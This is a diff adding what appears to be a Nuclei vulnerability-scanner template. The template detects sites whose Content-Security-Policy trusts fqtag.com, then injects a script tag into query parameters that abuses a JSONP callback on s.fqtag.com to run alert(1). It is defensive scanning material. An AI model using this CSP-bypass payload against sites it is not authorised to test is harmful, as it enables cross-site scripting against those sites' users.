@@ -1,0 +1,45 @@
+flow: http(1) && headless(1)
+headless:
+- fuzzing:
+  - fuzz:
+    - '{{url_encode(injection)}}'
+    mode: single
+    part: query
+    type: replace
+  matchers:
+  - dsl:
+    - fqtag_s_csp_xss == true
+    type: dsl
+  payloads:
+    injection:
+    - <script src="https://s.fqtag.com/b?callback=alert(1)"></script>
+  steps:
+  - action: navigate
+    args:
+      url: '{{BaseURL}}'
+  - action: waitdialog
+    args:
+      max-duration: 5s
+    name: fqtag_s_csp_xss
+http:
+- matchers:
+  - condition: and
+    internal: true
+    part: header
+    type: word
+    words:
+    - Content-Security-Policy
+    - fqtag.com
+  method: GET
+  path:
+  - '{{BaseURL}}'
+id: fqtag-s-csp-bypass
+info:
+  author: renniepak,DhiyaneshDK
+  metadata:
+    verified: true
+  name: Content-Security-Policy Bypass - FQTag S
+  reference:
+  - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  severity: medium
+  tags: xss,csp-bypass,fqtag-s,vuln
